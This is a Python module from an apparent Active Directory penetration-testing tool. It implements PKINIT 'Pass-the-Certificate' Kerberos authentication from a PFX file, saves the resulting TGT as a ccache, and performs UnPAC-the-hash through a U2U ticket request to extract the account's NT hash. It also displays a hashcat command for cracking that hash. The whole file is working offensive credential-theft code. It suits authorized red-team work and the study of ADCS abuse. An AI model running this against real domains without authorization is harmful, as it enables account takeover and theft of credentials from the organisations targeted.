"""Native ADCS certificate authentication via kerbad PKINIT (async).

Replaces ``certipy auth`` subprocess.  The public entry point is
:func:`authenticate_with_cert_native`.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from adscan_internal import telemetry
from adscan_core.rich_output import (
    get_console,
    mark_sensitive,
    print_error,
    print_info_debug,
    print_info_verbose,
    print_warning,
)


@dataclass(frozen=True)
class CertAuthConfig:
    """Parameters for certificate-based Kerberos authentication (PKINIT).

    Args:
        domain: Target AD domain.
        kdc_ip: IP address of the KDC.
        pfx_path: Path to the PFX containing the certificate and private key.
        pfx_password: Password protecting the PFX.
        username: Override the principal extracted from the certificate CN/SAN.
        skip_unpac: When True, skip the UnPAC-the-hash U2U round-trip entirely.
            Posture-aware callers set this when ``NTLM_AUTHENTICATION`` is
            known-disabled (HIGH confidence): no NTLM credential lives in the
            PAC on such domains, so the U2U could never recover an NT hash —
            it would only cost a wasted round-trip. The PKINIT TGT/ccache is
            the deliverable regardless. Defaults to False (run the U2U) so
            callers with UNKNOWN / NTLM-enabled / low-confidence posture keep
            today's behavior (observe-don't-infer).
    """

    domain: str
    kdc_ip: str
    pfx_path: Path
    pfx_password: str
    username: Optional[str] = None
    skip_unpac: bool = False


@dataclass
class CertAuthResult:
    """Result of a PKINIT authentication attempt.

    Args:
        success: Whether a TGT was obtained.
        ccache_path: Path to the written ccache file.
        nt_hash: NT hash recovered via UnPAC-the-hash (if available).
        principal: The authenticated principal (``user@domain``).
        error: Error message if ``success`` is False.
    """

    success: bool
    ccache_path: Optional[Path] = None
    nt_hash: Optional[str] = None
    principal: Optional[str] = None
    error: Optional[str] = None


# ---------------------------------------------------------------------------
# Premium Rich UX helpers
# ---------------------------------------------------------------------------


def _render_pkinit_preflight(
    config: "CertAuthConfig", display_upn: str, cert
) -> None:
    """Pre-flight panel for the PKINIT step."""
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column(style="bold")

    grid.add_row("Target KDC", mark_sensitive(config.kdc_ip, "ip"))
    grid.add_row("Realm", mark_sensitive(config.domain, "domain"))
    grid.add_row("Certificate", mark_sensitive(str(config.pfx_path), "path"))
    grid.add_row("Cert SAN UPN", f"[bold red]{mark_sensitive(display_upn, 'user')}[/]")
    if cert is not None:
        try:
            grid.add_row("Cert serial", f"[cyan]{cert.serial_number:X}[/]")
            grid.add_row(
                "Valid until",
                cert.not_valid_after_utc.strftime("%Y-%m-%d %H:%M UTC"),
            )
        except Exception:
            pass

    title = Text("  PKINIT Pass-the-Certificate  ", style="bold white on blue")
    panel = Panel(grid, title=title, border_style="blue", padding=(1, 2))
    get_console().print(panel)


def _render_pkinit_result(
    principal: str, ccache_path: Path, nt_hash: Optional[str]
) -> None:
    """Result panel for a successful PKINIT — includes hashcat-style hash output."""
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column()

    grid.add_row("Status", "[bold green]✓ TGT OBTAINED[/]")
    grid.add_row("Principal", f"[bold red]{mark_sensitive(principal, 'user')}[/]")
    grid.add_row("ccache", mark_sensitive(str(ccache_path), "path"))
    if nt_hash:
        grid.add_row(
            "NT hash",
            f"[bold yellow]{mark_sensitive(nt_hash, 'password')}[/] "
            f"[dim](UnPAC-the-hash)[/]",
        )
        # hashcat 1000 = NTLM
        grid.add_row("Hashcat mode", "[dim]-m 1000  (NTLM)[/]")
        grid.add_row(
            "Crack hint",
            f"[dim]hashcat -m 1000 '{mark_sensitive(nt_hash, 'password')}' wordlist.txt[/]",
        )
    else:
        grid.add_row("NT hash", "[dim]not extracted (PAC decryption pending)[/]")

    title = Text("  Authentication Successful  ", style="bold white on green")
    panel = Panel(grid, title=title, border_style="green", padding=(1, 2))
    get_console().print(panel)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


async def _extract_nt_hash_u2u(kcomm) -> Optional[str]:
    """Attempt UnPAC-the-hash via U2U TGS to recover the NT hash.

    Algorithm (mirrors certipy ``auth -no-save`` modulo the transport):
      1. ``get_TGT()`` (already done by the caller) — kerbad stashes the
         PKINIT-derived 32-byte AES256 key on ``kcomm.pkinit_tkey``.
      2. ``U2U()`` — request a service ticket *to self* with the
         ``enc-tkt-in-skey`` flag.  The reply ticket is encrypted to us so we
         can decrypt it locally with the AS-REP session key (kerbad does that
         for us and returns the decoded ``EncTicketPart``).
      3. The PAC arrives inside the ticket's authorization-data, wrapped in
         an ``AD-IF-RELEVANT`` (ad-type=1) container around an
         ``AD-WIN2K-PAC`` (ad-type=128).  Walk both layers.
      4. Locate the ``PAC_CREDENTIAL_INFO`` buffer (ulType=2).  Its
         ``SerializedData`` is encrypted with ``Key(AES256, pkinit_tkey)`` at
         key-usage 16 — decrypting it yields a ``TypeSerialization1`` header
         followed by a ``PAC_CREDENTIAL_DATA`` containing one or more
         ``NTLM_SUPPLEMENTAL_CREDENTIAL`` entries with the NT hash.

    Returns the hex NT-hash string, or ``None`` if anything in the chain
    fails (non-fatal — caller still gets a TGT).
    """
    try:
        pkinit_tkey = getattr(kcomm, "pkinit_tkey", None)
        if not pkinit_tkey:
            # Not a PKINIT TGT (e.g. caller used password) — UnPAC unavailable.
            return None

        from kerbad.protocol.external.ticketutil import get_NT_from_PAC  # noqa: PLC0415

        _tgs, _encpart, _key, decticket = await kcomm.with_clock_skew(kcomm.U2U)
        results = get_NT_from_PAC(pkinit_tkey, decticket)
        for _label, nt_hash in results:
            if nt_hash:
                return str(nt_hash)
        return None
    except Exception:
        # All failure modes are non-fatal — UnPAC is auxiliary to PKINIT.
        return None


# ---------------------------------------------------------------------------
# Public async entry point
# ---------------------------------------------------------------------------


async def _do_authenticate_with_cert(
    config: CertAuthConfig, output_dir: Path
) -> CertAuthResult:
    """Core async PKINIT implementation.

    Clock contract: this is shell-free transport and carries no ``shell``, so
    it cannot run the physical clock-sync guard. PKINIT/U2U is highly sensitive
    to clock skew (the per-request kerbad offset is insufficient — a skewed
    clock yields KDC_ERR_CLIENT_NOT_TRUSTED). The shell-bearing CALLER MUST
    ensure the host clock is fresh first via ``ensure_clock_synced_fresh`` /
    ``do_ensure_clock_synced_fresh``. Do NOT thread ``shell`` through
    ``CertAuthConfig`` to fix this here.
    """
    from kerbad.aioclient import AIOKerberosClient
    from kerbad.common.creds import KerberosCredential
    from kerbad.common.target import KerberosTarget

    # Pre-flight: read cert metadata to display in the panel
    from asn1crypto import core as asn1core

    _UPN_OID = "1.3.6.1.4.1.311.20.2.3"
    cert_upn: Optional[str] = None
    cert = None
    try:
        from cryptography.hazmat.primitives.serialization import pkcs12 as _pkcs12

        _, cert, _ = _pkcs12.load_key_and_certificates(
            config.pfx_path.read_bytes(),
            config.pfx_password.encode() if config.pfx_password else b"",
        )
        if cert is not None:
            from cryptography import x509 as cx509
            from cryptography.x509.oid import ExtensionOID

            try:
                san_ext = cert.extensions.get_extension_for_oid(
                    ExtensionOID.SUBJECT_ALTERNATIVE_NAME
                )
                for entry in san_ext.value.get_values_for_type(cx509.OtherName):
                    if entry.type_id == cx509.ObjectIdentifier(_UPN_OID):
                        cert_upn = asn1core.UTF8String.load(entry.value).native
                        break
            except Exception:
                pass
    except Exception:
        pass

    display_upn = cert_upn or (
        f"{config.username}@{config.domain}"
        if config.username
        else "(from certificate)"
    )

    _render_pkinit_preflight(config, display_upn, cert)

    print_info_verbose("  ▸ Loading certificate credential...")
    cred = KerberosCredential.from_pfx(
        str(config.pfx_path),
        config.pfx_password,
        username=config.username,
        domain=config.domain,
    )

    target = KerberosTarget(config.kdc_ip)
    kcomm = AIOKerberosClient(cred, target)

    print_info_verbose("  ▸ Requesting TGT via PKINIT (DH key exchange)...")
    await kcomm.with_clock_skew(kcomm.get_TGT)

    principal = f"{cred.username}@{cred.domain}"

    # Save ccache
    output_dir.mkdir(parents=True, exist_ok=True)
    safe_name = (cred.username or "cert").replace("\\", "_").replace("/", "_")
    ccache_path = output_dir / f"{safe_name}.ccache"
    kcomm.ccache.to_file(str(ccache_path))

    # Attempt UnPAC-the-hash (best-effort, non-fatal). Skipped when posture
    # reports NTLM is disabled (HIGH): on such domains the PAC carries no NTLM
    # credential, so the U2U round-trip can never recover a hash — the PKINIT
    # TGT/ccache is the credential and is returned as success either way.
    nt_hash: Optional[str] = None
    if config.skip_unpac:
        print_info_debug(
            "  ▸ NTLM disabled by posture — UnPAC-the-hash not applicable; "
            "PKINIT TGT/ccache is the credential."
        )
    else:
        try:
            nt_hash = await _extract_nt_hash_u2u(kcomm)
        except Exception as exc_u2u:
            telemetry.capture_exception(exc_u2u)
            print_warning(f"  UnPAC-the-hash attempt failed (non-fatal): {exc_u2u}")

    _render_pkinit_result(principal, ccache_path, nt_hash)

    return CertAuthResult(
        success=True,
        ccache_path=ccache_path,
        nt_hash=nt_hash,
        principal=principal,
    )


async def authenticate_with_cert_native(
    config: CertAuthConfig, output_dir: Path
) -> CertAuthResult:
    """Authenticate with a certificate via kerbad PKINIT.

    Args:
        config: Authentication parameters including PFX path, KDC IP, and domain.
        output_dir: Directory where the ccache file will be written on success.

    Returns:
        A :class:`CertAuthResult` with the ccache path and optional NT hash on
        success, or an error message on failure.
    """
    try:
        return await _do_authenticate_with_cert(config, output_dir)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error(f"Certificate authentication (PKINIT) failed: {exc}")
        return CertAuthResult(success=False, error=str(exc))
